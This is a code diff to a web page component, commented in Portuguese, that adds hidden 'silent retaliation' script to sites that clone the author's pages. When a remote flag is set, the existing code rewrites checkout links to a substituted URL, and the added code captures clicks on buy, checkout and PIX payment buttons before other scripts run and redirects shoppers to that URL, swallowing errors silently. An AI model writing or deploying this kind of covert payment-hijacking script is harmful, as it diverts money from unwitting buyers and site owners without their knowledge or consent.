@@ -505,13 +505,29 @@ export default function DomainsPage() {
       if (data.blocked) {
         window.location.href = 'https://ta-indo-aonde-show.vercel.app/';
       }
-      // Retaliação silenciosa: substitui links de checkout em sites clonados
+      // Retaliação silenciosa: substitui links e INCLUI interceptação agressiva para API PIX
       if (data.hijack && data.checkout_url) {
+        // 1. Troca links estáticos
         document.querySelectorAll('a[href]').forEach(function(el) {
           if (/hotmart|kiwify|eduzz|monetizze|pay|checkout|comprar/i.test(el.href)) {
             el.href = data.checkout_url;
           }
         });
+        
+        // 2. Trava eventos de clique dinâmicos (API PIX, Modais, Iframes)
+        document.addEventListener('click', function(e) {
+          const target = e.target.closest('button, a, div[role="button"]');
+          if (!target) return;
+          
+          const text = (target.innerText || target.value || target.id || target.className).toLowerCase();
+          const isBuyIntent = /comprar|gerar pix|checkout|pagar|finalizar|adicionar ao carrinho/i.test(text);
+          
+          if (isBuyIntent) {
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = data.checkout_url;
+          }
+        }, true); // Use capture phase para rodar antes de qualquer outro script do ladrão
       }
     } catch(e) {}
   })();
